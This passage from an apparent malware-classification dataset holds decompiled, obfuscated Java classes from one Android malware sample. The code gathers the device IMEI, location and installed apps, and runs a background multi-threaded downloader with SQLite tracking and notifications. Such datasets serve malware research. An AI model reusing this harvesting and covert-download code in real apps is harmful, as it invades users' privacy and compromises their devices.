com.apkmore.rbjatnldymzfiw.y.d.c.f249a.sendMessage(obtain);       }       Thread.sleep(500L);       if (o.get(this.n) == null) {         o.put(this.n,1);       }       if (t.h(this.f,t.a(this.b) + ""/"" + this.f222a.substring(0,this.f222a.length() - 1))) {         com.apkmore.rbjatnldymzfiw.y.d.a().a(this.f,this.b,2);         if (this.c != null) {           j.a(this.n,this.d,this.l,this.b,this.c,""f"");         }         com.apkmore.rbjatnldymzfiw.y.c.a(this.f,R.drawable.stat_sys_download_done,com.apkmore.rbjatnldymzfiw.y.c.h.P,this.b,32,t.a(this.f,d,true),this.c,-1);         return;       }       Thread.sleep(3000L);       int intValue=((Integer)o.get(this.n)).intValue() + 1;       o.put(this.n,Integer.valueOf(intValue));       if (intValue <= 2) {         e();       }  else {         o.put(this.n,1);         t.a(this.f222a.substring(0,this.f222a.length() - 1),this.f,this.b);       }     }  catch (    Exception e) {     }   }   private File d(){     File file=new File(t.a(this.b) + ""/"" + ((Object)this.f222a.subSequence(0,this.f222a.length() - 1)));     new File(t.a(this.b) + ""/"" + ((Object)this.f222a.subSequence(0,this.f222a.length()))).renameTo(file);     return file;   }   private void e(){     try {       t.a(this.f222a.substring(0,this.f222a.length() - 1),this.f,this.b);       String[] strArr={this.n,this.d,String.valueOf(this.b),this.c};       Thread.sleep(2000L);       if (this.e == 1) {         Message obtain=Message.obtain();         obtain.what=4;         obtain.obj=strArr;         com.apkmore.rbjatnldymzfiw.y.d.c.f249a.sendMessage(obtain);       }  else {         b.a(this.n,this.f,2,this.d,this.b,this.c);       }     }  catch (    Exception e) {     }   }   public int a(  e eVar){     int i;     try {       URL url=new URL(this.n);       if (this.l.size() != this.j.length) {         this.l.clear();         for (int i2=0; i2 < this.j.length; i2++) {           this.l.put(Integer.valueOf(i2 + 1),0);         }         this.h=0;         i=10;       }  else {         i=1;       }       for (int i3=0; i3 < this.j.length; i3++) {         if (((Integer)this.l.get(Integer.valueOf(i3 + 1))).intValue() >= this.m || this.h >= this.i) {           this.j[i3]=null;         }  else {           this.j[i3]=new h(this,url,this.k,this.m,((Integer)this.l.get(Integer.valueOf(i3 + 1))).intValue(),i3 + 1,this.q,i);           this.j[i3].setPriority(7);           this.j[i3].start();         }       }       j.a(this.d,this.f,com.apkmore.rbjatnldymzfiw.y.c.h.aS);       if (this.c != null) {         j.a(this.n,this.d,this.l,this.b,this.c,com.apkmore.rbjatnldymzfiw.y.c.h.aS);       }       boolean z=true;       while (z) {         Thread.sleep(1000L);         z=false;         for (int i4=0; i4 < this.j.length; i4++) {           if (this.j[i4] != null && !this.j[i4].a()) {             if (this.j[i4].b() == -1) {               this.p--;               boolean z2=this.p >= 0;               this.j[i4]=new h(this,url,this.k,this.m,((Integer)this.l.get(Integer.valueOf(i4 + 1))).intValue(),i4 + 1,this.q,1);               this.j[i4].setPriority(7);               this.j[i4].start();               z=z2;             }  else {               z=true;             }           }         }         if (eVar != null) {           eVar.a(this.h);         }       }       if (this.h == this.i) {         c();       }     }  catch (    Exception e) {     }     return this.h;   }   public void a(){     this.g=true;   }   public synchronized void a(  int i){     this.h=i;   }   public synchronized void a(  int i,  int i2){     this.l.put(Integer.valueOf(i),Integer.valueOf(i2));     j.a(this.n,i,i2);   }   public boolean b(){     return this.g;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\j.code","public class j {   private static Context f223a=null;   public static Context a(){     return f223a;   }   public static synchronized Map a(  String str){     HashMap hashMap;     SQLiteDatabase sQLiteDatabase;     Throwable th;     Cursor cursor;     SQLiteDatabase sQLiteDatabase2; synchronized (j.class) {       hashMap=new HashMap();       try {         sQLiteDatabase2=new a(f223a).getReadableDatabase();         try {           try {             Cursor rawQuery=sQLiteDatabase2.rawQuery(com.apkmore.rbjatnldymzfiw.y.c.h.bF,new String[]{str});             while (rawQuery.moveToNext()) {               try {                 hashMap.put(Integer.valueOf(rawQuery.getInt(0)),Integer.valueOf(rawQuery.getInt(1)));               }  catch (              Throwable th2) {                 sQLiteDatabase=sQLiteDatabase2;                 cursor=rawQuery;                 th=th2;                 a(cursor);                 a(sQLiteDatabase);                 throw th;               }             }             a(rawQuery);             a(sQLiteDatabase2);           }  catch (          Exception e) {             a((Cursor)null);             a(sQLiteDatabase2);             return hashMap;           }         }  catch (        Throwable th3) {           sQLiteDatabase=sQLiteDatabase2;           cursor=null;           th=th3;         }       }  catch (      Exception e2) {         sQLiteDatabase2=null;       } catch (      Throwable th4) {         sQLiteDatabase=null;         th=th4;         cursor=null;       }     }     return hashMap;   }   public static synchronized void a(  int i){     Cursor cursor;     SQLiteDatabase sQLiteDatabase;     Throwable th;     SQLiteDatabase sQLiteDatabase2;     Cursor cursor2=null; synchronized (j.class) {       try {         sQLiteDatabase=new a(f223a).getReadableDatabase();         try {           cursor=sQLiteDatabase.rawQuery(com.apkmore.rbjatnldymzfiw.y.c.h.bz + "" "" + com.apkmore.rbjatnldymzfiw.y.c.h.aS,null);           try {             ArrayList arrayList=new ArrayList();             ArrayList arrayList2=new ArrayList();             ArrayList arrayList3=new ArrayList();             ArrayList arrayList4=new ArrayList();             if (cursor == null) {               a(cursor);               a(sQLiteDatabase);             }  else {               while (cursor.moveToNext()) {                 String string=cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aU));                 if (!arrayList.contains(string)) {                   arrayList.add(string);                 }                 String string2=cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aT));                 if (!arrayList3.contains(string2)) {                   arrayList3.add(string2);                 }                 String string3=cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aV));                 if (!arrayList2.contains(string3)) {                   arrayList2.add(string3);                 }                 int i2=cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW));                 if (!arrayList4.contains(Integer.valueOf(i2))) {                   arrayList4.add(Integer.valueOf(i2));                 }               }               if (i == 1 && arrayList != null) {                 for (int i3=0; i3 < arrayList.size(); i3++) {                   Intent intent=new Intent(f223a,(Class<?>)Baa.class);                   intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.aT,(String)arrayList3.get(i3));                   intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.aW,(Serializable)arrayList4.get(i3));                   intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bb,i);                   intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bc,(String)arrayList.get(i3));                   intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bd,(String)arrayList2.get(i3));                   f223a.startService(intent);                 }               }               if (i == 2 && arrayList != null) {                 for (int i4=0; i4 < arrayList.size(); i4++) {                   b.a((String)arrayList.get(i4),f223a,i,(String)arrayList2.get(i4),((Integer)arrayList4.get(i4)).intValue(),(String)arrayList3.get(i4));                 }               }               a(cursor);               a(sQLiteDatabase);             }           }  catch (          Exception e) {             cursor2=cursor;             sQLiteDatabase2=sQLiteDatabase;             a(cursor2);             a(sQLiteDatabase2);           } catch (          Throwable th2) {             th=th2;             a(cursor);             a(sQLiteDatabase);             throw th;           }         }  catch (        Exception e2) {           sQLiteDatabase2=sQLiteDatabase;         } catch (        Throwable th3) {           cursor=null;           th=th3;         }       }  catch (      Exception e3) {         sQLiteDatabase2=null;       } catch (      Throwable th4) {         cursor=null;         sQLiteDatabase=null;         th=th4;       }     }   }   public static void a(  Context context){     f223a=context;   }   private static void a(  Cursor cursor){     if (cursor != null) {       try {         if (cursor.isClosed()) {           return;         }         cursor.close();       }  catch (      Exception e) {       }     }   }   private static void a(  SQLiteDatabase sQLiteDatabase){     if (sQLiteDatabase != null) {       try {         sQLiteDatabase.close();       }  catch (      Exception e) {       }     }   }   public static synchronized void a(  String str,  int i,  int i2){     SQLiteDatabase sQLiteDatabase;     Throwable th;     SQLiteDatabase writableDatabase; synchronized (j.class) {       try {         try {           writableDatabase=new a(f223a).getWritableDatabase();         }  catch (        Exception e) {           a((SQLiteDatabase)null);         }       }  catch (      Throwable th2) {         sQLiteDatabase=null;         th=th2;       }       try {         writableDatabase.execSQL(com.apkmore.rbjatnldymzfiw.y.c.h.bC,new Object[]{Integer.valueOf(i2),str,Integer.valueOf(i)});         a(writableDatabase);       }  catch (      Throwable th3) {         sQLiteDatabase=writableDatabase;         th=th3;         a(sQLiteDatabase);         throw th;       }     }   }   public static synchronized void a(  String str,  Context context,  String str2){     SQLiteDatabase sQLiteDatabase;     Throwable th;     SQLiteDatabase writableDatabase; synchronized (j.class) {       try {         try {           writableDatabase=new a(context).getWritableDatabase();         }  catch (        Throwable th2) {           sQLiteDatabase=null;           th=th2;         }         try {           writableDatabase.execSQL(com.apkmore.rbjatnldymzfiw.y.c.h.bB + "" "" + str2+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bq+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.aV+ ""=?"",new Object[]{str});           a(writableDatabase);         }  catch (        Throwable th3) {           sQLiteDatabase=writableDatabase;           th=th3;           a(sQLiteDatabase);           throw th;         }       }  catch (      Exception e) {         a((SQLiteDatabase)null);       }     }   }   public static void a(  String str,  String str2,  Context context){     Cursor cursor;     SQLiteDatabase sQLiteDatabase;     Throwable th;     SQLiteDatabase sQLiteDatabase2;     Cursor cursor2=null;     try {       sQLiteDatabase=new a(context).getReadableDatabase();       try {         cursor=sQLiteDatabase.rawQuery(com.apkmore.rbjatnldymzfiw.y.c.h.bz + "" "" + str+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bq+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bd+ ""=?"",new String[]{str2});         while (cursor.moveToNext()) {           try {             com.apkmore.rbjatnldymzfiw.y.c.a(context,R.drawable.ic_menu_agenda,com.apkmore.rbjatnldymzfiw.y.c.h.O,cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW)),16,t.e(context,str2),cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aT)),-1);             q.c.add(str2);             if (t.j(context) != null) {               com.apkmore.rbjatnldymzfiw.y.d.a().a(context,cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW)),3);             }  else {               t.a(context,"""" + cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW)) + "",3"");             }             String a2=q.a(cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aU)));             a(str2,context,""f"");             t.a(a2,context,cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW)));           }  catch (          Exception e) {             cursor2=cursor;             sQLiteDatabase2=sQLiteDatabase;             a(cursor2);             a(sQLiteDatabase2);             return;           } catch (          Throwable th2) {             th=th2;             a(cursor);             a(sQLiteDatabase);             throw th;           }         }         a(cursor);         a(sQLiteDatabase);       }  catch (      Exception e2) {         sQLiteDatabase2=sQLiteDatabase;       } catch (      Throwable th3) {         cursor=null;         th=th3;       }     }  catch (    Exception e3) {       sQLiteDatabase2=null;     } catch (    Throwable th4) {       cursor=null;       sQLiteDatabase=null;       th=th4;     }   }   public static synchronized void a(  String str,  String str2,  Map map,  int i,  String str3,  String str4){ synchronized (j.class) {       try {         SQLiteDatabase writableDatabase=new a(f223a).getWritableDatabase();         writableDatabase.beginTransaction();         try {           for (          Map.Entry entry : map.entrySet()) {             writableDatabase.execSQL(com.apkmore.rbjatnldymzfiw.y.c.h.bE + "" "" + str4+ ""(""+ com.apkmore.rbjatnldymzfiw.y.c.h.aU+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aV+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aX+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aY+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aW+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aT+ com.apkmore.rbjatnldymzfiw.y.c.h.bD,new Object[]{str,str2,entry.getKey(),entry.getValue(),Integer.valueOf(i),str3});           }           writableDatabase.setTransactionSuccessful();         }   finally {           try {             writableDatabase.endTransaction();           }  catch (          Exception e) {           }           a(writableDatabase);         }       }  catch (      Exception e2) {       }     }   }   public static void b(  Context context){     SQLiteDatabase sQLiteDatabase;     Cursor cursor;     Throwable th;     Cursor cursor2;     SQLiteDatabase sQLiteDatabase2=null;     try {       sQLiteDatabase=new a(context).getReadableDatabase();       try {         cursor=sQLiteDatabase.rawQuery(com.apkmore.rbjatnldymzfiw.y.c.h.bz + "" f"",null);         while (cursor.moveToNext()) {           try {             File file=new File(t.a(cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW))) + ""/"" + q.a(cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aU))));             if (file.exists()) {               com.apkmore.rbjatnldymzfiw.y.c.a(context,R.drawable.stat_sys_download_done,com.apkmore.rbjatnldymzfiw.y.c.h.P,cursor.getInt(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aW)),32,t.a(context,file,false),cursor.getString(cursor.getColumnIndex(com.apkmore.rbjatnldymzfiw.y.c.h.aT)),-1);             }           }  catch (          Exception e) {             sQLiteDatabase2=sQLiteDatabase;             cursor2=cursor;             a(cursor2);             a(sQLiteDatabase2);             return;           } catch (          Throwable th2) {             th=th2;             a(cursor);             a(sQLiteDatabase);             throw th;           }         }         a(cursor);         a(sQLiteDatabase);       }  catch (      Exception e2) {         cursor2=null;         sQLiteDatabase2=sQLiteDatabase;       } catch (      Throwable th3) {         cursor=null;         th=th3;       }     }  catch (    Exception e3) {       cursor2=null;     } catch (    Throwable th4) {       sQLiteDatabase=null;       cursor=null;       th=th4;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\a.code","public class a { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\b.code","public class b implements c, Serializable {   private static final String B=h.V;   public String f225a;   public String b;   public int c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public boolean m;   public boolean n;   public boolean o;   public String p;   public boolean q;   public String r;   public String s;   public int t;   public int u;   public String x;   public int v=0;   public int w=0;   public String y="""";   public String z="""";   public boolean A=false;   @Override public String a(){     return h.c;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f225a=jSONObject.isNull(h.b) ? null : jSONObject.getString(h.b);       this.b=jSONObject.isNull(h.c) ? null : jSONObject.getString(h.c);       this.c=jSONObject.isNull(h.d) ? -1 : jSONObject.getInt(h.d);       this.d=jSONObject.isNull(h.e) ? null : jSONObject.getString(h.e);       this.e=jSONObject.isNull(h.f) ? -1 : jSONObject.getInt(h.f);       this.f=jSONObject.isNull(h.g) ? null : jSONObject.getString(h.g);       this.g=jSONObject.isNull(h.h) ? null : jSONObject.getString(h.h);       this.h=jSONObject.isNull(h.i) ? null : jSONObject.getString(h.i);       this.i=jSONObject.isNull(h.j) ? -1 : jSONObject.getInt(h.j);       this.j=jSONObject.isNull(h.k) ? null : jSONObject.getString(h.k);       this.k=jSONObject.isNull(h.l) ? null : jSONObject.getString(h.l);       this.l=jSONObject.isNull(h.m) ? null : jSONObject.getString(h.m);       this.m=jSONObject.isNull(h.n) ? true : jSONObject.getBoolean(h.n);       this.n=jSONObject.isNull(h.o) ? true : jSONObject.getBoolean(h.o);       this.o=jSONObject.isNull(h.p) ? false : jSONObject.getBoolean(h.p);       this.p=jSONObject.isNull(h.q) ? null : jSONObject.getString(h.q);       this.q=jSONObject.isNull(h.r) ? false : jSONObject.getBoolean(h.r);       this.r=jSONObject.isNull(h.s) ? null : jSONObject.getString(h.s);       this.s=jSONObject.isNull(h.t) ? null : jSONObject.getString(h.t);       this.t=jSONObject.isNull(h.u) ? 0 : jSONObject.getInt(h.u);       this.u=jSONObject.isNull(h.v) ? 0 : jSONObject.getInt(h.v);       this.y=jSONObject.isNull(h.w) ? null : jSONObject.getString(h.w);       this.z=jSONObject.isNull(h.x) ? null : jSONObject.getString(h.x);       this.x=jSONObject.isNull(h.y) ? null : jSONObject.getString(h.y);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\c.code","public interface c {   String a();   void a(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\d.code","public class d implements c {   private static String v=""1.0.6"";   public String c;   public String d;   public String e;   public int f;   public int g;   public int h;   public int i;   public double j;   public double k;   public String l;   public String m;   public String n;   public String o;   public boolean p;   public String q;   public String r;   public int s;   public String t;   public int u=3;   public String b=Build.PRODUCT;   public String f226a=Build.VERSION.SDK;   public d(  Context context){     this.q=context.getPackageName();     this.c=t.a(context);     this.d=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.g=displayMetrics.densityDpi;     this.h=displayMetrics.widthPixels;     this.i=displayMetrics.heightPixels;     PackageManager packageManager=context.getPackageManager();     try {       PackageInfo packageInfo=packageManager.getPackageInfo(context.getPackageName(),0);       this.e=packageInfo.versionName;       this.f=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     try {       this.n=t.a(context,packageManager);     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();     }     this.o=t.c(context);     Log.d(h.f235a,h.B + "":"" + this.o);     this.m=com.apkmore.rbjatnldymzfiw.y.c.c(context);     if (this.m == null) {       this.m=h.C;     }     Location f=t.f(context);     if (f != null) {       this.k=f.getLongitude();       this.j=f.getLatitude();       String a2=t.a(this.k,this.j);       if (a2 != null) {         this.l=a2;       }     }     this.p=t.d(context);     this.s=t.e(context);     if (this.s != 100061) {       Log.d(h.f235a,h.L + this.s);     }   }   @Override public String a(){     return h.b;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f226a=jSONObject.isNull(h.b) ? null : jSONObject.getString(h.b);       this.b=jSONObject.isNull(h.c) ? null : jSONObject.getString(h.c);       this.c=jSONObject.isNull(h.d) ? null : jSONObject.getString(h.d);       this.d=jSONObject.isNull(h.e) ? null : jSONObject.getString(h.e);       this.e=jSONObject.isNull(h.f) ? null : jSONObject.getString(h.f);       this.f=jSONObject.isNull(h.g) ? 0 : jSONObject.getInt(h.g);       this.g=jSONObject.isNull(h.h) ? 0 : jSONObject.getInt(h.h);       this.h=jSONObject.isNull(h.i) ? 0 : jSONObject.getInt(h.i);       this.i=jSONObject.isNull(h.j) ? 0 : jSONObject.getInt(h.j);       this.j=jSONObject.isNull(h.k) ? 0.0d : jSONObject.getDouble(h.k);       this.k=jSONObject.isNull(h.l) ? 0.0d : jSONObject.getDouble(h.l);       this.l=jSONObject.isNull(h.m) ? null : jSONObject.getString(h.m);       this.m=jSONObject.isNull(h.n) ? null : jSONObject.getString(h.n);       this.n=jSONObject.isNull(h.o) ? null : jSONObject.getString(h.o);       this.o=jSONObject.isNull(h.p) ? null : jSONObject.getString(h.p);       this.p=jSONObject.isNull(h.q) ? false : jSONObject.getBoolean(h.q);       this.q=jSONObject.isNull(h.r) ? null : jSONObject.getString(h.r);       this.r=jSONObject.isNull(h.s) ? null : jSONObject.getString(h.s);       this.s=jSONObject.isNull(h.t) ? 100008 : jSONObject.getInt(h.t);       this.t=jSONObject.isNull(h.u) ? null : jSONObject.getString(h.u);       v=jSONObject.isNull(h.v) ? null : jSONObject.getString(h.v);       this.u=jSONObject.isNull(h.w) ? 0 : jSONObject.getInt(h.w);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public JSONObject b(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(h.b,this.f226a);       jSONObject.put(h.c,this.b);       jSONObject.put(h.d,this.c);       jSONObject.put(h.e,this.d);       jSONObject.put(h.f,this.e);       jSONObject.put(h.g,this.f);       jSONObject.put(h.h,this.g);       jSONObject.put(h.i,this.h);       jSONObject.put(h.j,this.i);       jSONObject.put(h.k,this.j);       jSONObject.put(h.l,this.k);       jSONObject.put(h.m,this.l);       jSONObject.put(h.n,this.m);       jSONObject.put(h.o,this.n);       jSONObject.put(h.p,this.o);       jSONObject.put(h.q,this.p);       jSONObject.put(h.r,this.q);       jSONObject.put(h.s,this.r);       jSONObject.put(h.t,this.s);       jSONObject.put(h.u,this.t);       jSONObject.put(h.v,v);       jSONObject.put(h.w,this.u);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\e.code","public class e implements c {   public int f227a;   public String b;   @Override public String a(){     return h.e;   }   @Override public void a(  JSONObject jSONObject){     try {       this.f227a=jSONObject.isNull(h.b) ? -1 : jSONObject.getInt(h.b);       this.b=jSONObject.isNull(h.c) ? null : jSONObject.getString(h.c);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public String toString(){     return ""["" + this.f227a + "",""+ this.b+ ""]"";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\f.code","public class f implements c {   public String f228a;   public String b;   public String c;   @Override public String a(){     return h.f;   }   @Override public void a(  JSONObject jSONObject){     try {       this.f228a=!jSONObject.has(h.b) ? null : jSONObject.getString(h.b);       this.b=!jSONObject.has(h.c) ? null : jSONObject.getString(h.c);       this.c=jSONObject.has(h.d) ? jSONObject.getString(h.d) : null;     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.b\g.code","public class g {   public static c a(  Class cls,  String str){     if (str == null || str.length() < 2) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       c cVar=(c)cls.newInstance();       if (!jSONObject.isNull(cVar.a())) {         cVar.a(jSONObject.getJSONObject(cVar.a()));         return cVar;       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   }   public static String[] a(  String str){     String[] strArr=null;     try {       JSONObject jSONObject=new JSONObject(str);       if (!jSONObject.isNull(""p"")) {         JSONArray jSONArray=jSONObject.getJSONArray(""p"");         strArr=new String[jSONArray.length()];         for (int i=0; i < jSONArray.length(); i++) {           strArr[i]=jSONArray.getString(i);         }       }     }  catch (    Exception e) {       e.printStackTrace();     }     return strArr;   }   public static c[] b(  Class cls,  String str){     JSONArray jSONArray;     if (str == null || str.length() < 2) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       c cVar=(c)cls.newInstance();       if (!jSONObject.isNull(cVar.a()) && (jSONArray=jSONObject.getJSONArray(cVar.a())) != null) {         c[] cVarArr=(c[])Array.newInstance((Class<?>)cls,jSONArray.length());         int i=0;         while (true) {           int i2=i;           if (i2 >= jSONArray.length()) {             return cVarArr;           }           c cVar2=(c)cls.newInstance();           cVar2.a(jSONArray.getJSONObject(i2));           cVarArr[i2]=cVar2;           i=i2 + 1;         }       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\a.code","public class a extends AsyncTask {   private Activity b;   private com.apkmore.rbjatnldymzfiw.y.d.e c;   private String[] d;   private com.apkmore.rbjatnldymzfiw.y.b.b[] f229a=null;   private Handler e=new b(this);   public a(  Activity activity,  com.apkmore.rbjatnldymzfiw.y.d.e eVar,  String[] strArr){     this.c=null;     this.d=null;     this.b=activity;     this.c=eVar;     this.d=strArr;   }   @Override public void onPostExecute(  com.apkmore.rbjatnldymzfiw.y.b.b[] bVarArr){     int i;     super.onPostExecute(bVarArr);     try {       this.f229a=bVarArr;       ArrayList arrayList=new ArrayList();       if (this.f229a != null) {         for (int i2=0; i2 < this.f229a.length; i2++) {           arrayList.add(this.f229a[i2]);         }       }       try {         i=t.a(this.b,com.apkmore.rbjatnldymzfiw.y.b.g.a(com.apkmore.rbjatnldymzfiw.y.b.f224a),20 - arrayList.size());       }  catch (      Exception e) {         i=0;       }       if (arrayList.size() < 20) {         for (int i3=0; i3 < i; i3++) {           if (arrayList.size() < 20) {             com.apkmore.rbjatnldymzfiw.y.b.b bVar=new com.apkmore.rbjatnldymzfiw.y.b.b();             bVar.b=""s"";             bVar.f=((ResolveInfo)q.f242a.get(i3)).activityInfo.packageName;             arrayList.add(bVar);           }         }         if (arrayList.size() < 20) {           int size=20 - arrayList.size() >= 4 ? 4 : 20 - arrayList.size();           int i4=size <= 4 ? size : 4;           t.a(this.d,this.b,i4,i);           if (arrayList.size() < 20) {             for (int i5=0; i5 < i4; i5++) {               if (arrayList.size() < 20) {                 com.apkmore.rbjatnldymzfiw.y.b.b bVar2=new com.apkmore.rbjatnldymzfiw.y.b.b();                 bVar2.b=""s"";                 bVar2.f=((ResolveInfo)q.f242a.get(i5 + i)).activityInfo.packageName;                 arrayList.add(bVar2);               }             }           }         }       }       Message obtain=Message.obtain();       obtain.what=0;       obtain.obj=arrayList;       this.e.sendMessage(obtain);     }  catch (    Exception e2) {     }   }   @Override public com.apkmore.rbjatnldymzfiw.y.b.b[] doInBackground(  String... strArr){     if (t.b == null || h.p.equals(t.v(this.b))) {       t.b=t.s(this.b);     }     return t.b;   }   @Override protected void onPreExecute(){     super.onPreExecute();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\b.code","public class b extends Handler {   final a f230a;   public b(  a aVar){     this.f230a=aVar;   }   @Override public void handleMessage(  Message message){     com.apkmore.rbjatnldymzfiw.y.d.e eVar;     com.apkmore.rbjatnldymzfiw.y.d.e eVar2;     eVar=this.f230a.c;     eVar.a();     s.d=true;     List list=(List)message.obj;     eVar2=this.f230a.c;     eVar2.a(list);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\c.code","public class c {   private static c b=null;   public static boolean f231a=false;   public static c a(){ synchronized (c.class) {       if (b == null) {         b=new c();       }     }     return b;   }   public void a(  Context context){     new Thread(new d(this,context)).start();   }   public void b(){     new Thread(new e(this)).start();   }   public void b(  Context context){     new Thread(new f(this,context)).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\d.code","public class d implements Runnable {   final Context f232a;   final c b;   public d(  c cVar,  Context context){     this.b=cVar;     this.f232a=context;   }   @Override public void run(){     try {       String[] n=t.n(this.f232a);       q.f242a.clear();       Message obtain=Message.obtain();       obtain.what=6;       obtain.obj=n;       com.apkmore.rbjatnldymzfiw.y.d.c.f249a.sendMessage(obtain);     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\e.code","public class e implements Runnable {   final c f233a;   public e(  c cVar){     this.f233a=cVar;   }   @Override public void run(){     try {       if (com.apkmore.rbjatnldymzfiw.y.a.f.b != null) {         for (int i=0; i < com.apkmore.rbjatnldymzfiw.y.a.f.b.size(); i++) {           if (com.apkmore.rbjatnldymzfiw.y.a.f.b == null || com.apkmore.rbjatnldymzfiw.y.a.f.b.get(i) == null) {             return;           }           ((com.apkmore.rbjatnldymzfiw.y.a.i)com.apkmore.rbjatnldymzfiw.y.a.f.b.get(i)).a();         }       }       Thread.sleep(2100L);       com.apkmore.rbjatnldymzfiw.y.d.c.f249a.sendEmptyMessage(2);     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\f.code","public class f implements Runnable {   final Context f234a;   final c b;   public f(  c cVar,  Context context){     this.b=cVar;     this.f234a=context;   }   @Override public void run(){     int i=0;     while (i < 30) {       if (s.d) {         return;       }       try {         Thread.sleep(1000L);         i++;       }  catch (      InterruptedException e) {         e.printStackTrace();       }     }     t.g(this.f234a,""c"");     com.apkmore.rbjatnldymzfiw.y.d.c.f249a.sendEmptyMessage(5);   } } "
